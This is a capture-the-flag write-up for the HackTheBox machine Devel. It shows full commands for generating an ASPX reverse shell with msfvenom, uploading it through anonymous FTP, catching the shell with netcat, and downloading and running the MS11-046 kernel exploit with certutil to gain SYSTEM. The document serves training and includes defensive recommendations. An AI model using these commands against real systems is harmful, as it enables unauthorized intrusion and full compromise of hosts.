---
title: "HackTheBox: Devel - FTP Upload to IIS & Kernel Exploit Privesc"
date: 2026-02-21
draft: false
description: "Walkthrough of HackTheBox Devel, uploading a web shell via anonymous FTP to an IIS server and escalating to SYSTEM using MS11-046 kernel exploit."
tags: ["hackthebox", "windows", "ftp", "iis", "kernel-exploit", "privesc"]
---

## Introduction

Devel is a Windows machine on HackTheBox that demonstrates a classic attack chain: anonymous FTP access to a web server's root directory, allowing us to upload a malicious web shell. We then exploit an unpatched Windows 7 system using a kernel vulnerability to gain SYSTEM privileges.

- **Difficulty:** Easy
- **OS:** Windows
- **Skills:** FTP enumeration, web shell upload, Windows kernel exploitation

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -oN nmap/devel 10.129.2.19
```

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | Microsoft ftpd |
| 80 | HTTP | Microsoft IIS 7.5 |

Key finding from Nmap:
```bash
ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
| 03-17-17  04:37PM               184946 welcome.png
```

The FTP server allows anonymous login and contains `iisstart.htm` - the default IIS welcome page. This tells us **FTP is serving the IIS web root directory**.

---

## Enumeration

### Confirming FTP Access
```bash
ftp 10.129.2.19
```
```bash
Name: anonymous
Password: (blank)
230 User logged in.
```
```bash
ftp> ls
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
```

### Testing Write Access
```bash
ftp> put test.txt
226 Transfer complete.
```

We have both read and write access to the IIS web root. This means we can upload a web shell and execute it through the browser.

---

## Initial Access

### Why ASPX?

IIS 7.5 is an ASP.NET web server that executes `.aspx` files by default. We'll create an ASPX reverse shell payload.

### Creating the Payload
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f aspx -o shell.aspx
```

### Uploading via FTP
```bash
ftp> put shell.aspx
226 Transfer complete.
```

### Triggering the Shell

Start listener on Kali:
```bash
nc -lvnp 4444
```

Browse to trigger the shell:
```bash
http://10.129.2.19/shell.aspx
```

We catch a shell as `iis apppool\web`.

---

## Privilege Escalation

### Checking Privileges
```cmd
whoami /priv
```
```cmd
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

**SeImpersonatePrivilege** is enabled. This privilege allows token impersonation attacks (like Potato exploits). However, on older unpatched systems, kernel exploits are often more reliable.

### System Information
```cmd
systeminfo
```

| Finding | Value |
|---------|-------|
| OS | Windows 7 Enterprise |
| Build | 6.1.7600 (no Service Pack) |
| Architecture | x86 (32-bit) |
| Hotfixes | **None installed** |

An unpatched Windows 7 x86 system is vulnerable to multiple kernel exploits.

### Choosing the Exploit

MS11-046 is a reliable local privilege escalation exploit targeting the AFD (Ancillary Function Driver) in Windows. It works on Windows 7 x86 without service packs.
```bash
searchsploit ms11-046
searchsploit -m 40564
```

### Compiling the Exploit
```bash
i686-w64-mingw32-gcc 40564.c -o ms11-046.exe -lws2_32
```

- `i686-w64-mingw32-gcc` - Cross-compiler for 32-bit Windows
- `-lws2_32` - Links the Winsock library required by the exploit

### Transferring to Target

On Kali:
```bash
python3 -m http.server 80
```

On target:
```cmd
cd C:\Windows\Temp
certutil -urlcache -f http://10.10.14.3/ms11-046.exe ms11-046.exe
```

We use `C:\Windows\Temp` because it's a world-writable directory, and `certutil` because it's a built-in Windows tool that can download files.

### Executing the Exploit
```cmd
ms11-046.exe
```
```cmd
whoami
nt authority\system
```

---

## Attack Path Summary
```bash
Nmap (ports 21, 80)
        │
        ▼
FTP anonymous login allowed
        │
        ▼
FTP root = IIS web root (saw iisstart.htm)
        │
        ▼
Tested write access - success
        │
        ▼
Uploaded ASPX reverse shell
        │
        ▼
Triggered via browser → shell as iis apppool\web
        │
        ▼
whoami /priv → SeImpersonatePrivilege
        │
        ▼
systeminfo → Windows 7 x86, no hotfixes
        │
        ▼
MS11-046 kernel exploit
        │
        ▼
SYSTEM
```

---

## Key Takeaways

### Why This Attack Worked

| Vulnerability | Impact |
|---------------|--------|
| Anonymous FTP with write access | Could upload malicious files |
| FTP serves web root | Uploaded files are web-accessible |
| IIS executes ASPX | Web shell gave us code execution |
| Unpatched Windows 7 | Kernel exploit worked |

### Defensive Measures

| Recommendation | Priority |
|----------------|----------|
| Disable anonymous FTP | Critical |
| Separate FTP from web root | Critical |
| Keep Windows patched | Critical |
| Restrict IIS file execution | High |
| Remove SeImpersonatePrivilege from service accounts | Medium |

---

## Lessons Learned

1. **FTP + Web server = Check overlap** - If FTP serves the web root, you can upload shells
2. **Anonymous access needs write test** - Read access is useless without write
3. **Check architecture** - x86 vs x64 determines which exploits work
4. **Unpatched = Easy privesc** - No hotfixes means kernel exploits will work
5. **certutil for transfers** - Built-in Windows tool, works on older systems

---

## Tools Used

- Nmap
- FTP client
- msfvenom
- Netcat
- mingw32 cross-compiler
- certutil

---

## References

- [MS11-046 - Microsoft Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046)
- [Exploit-DB 40564](https://www.exploit-db.com/exploits/40564)

---

*This writeup is for educational purposes. Only test on systems you have permission to access.*
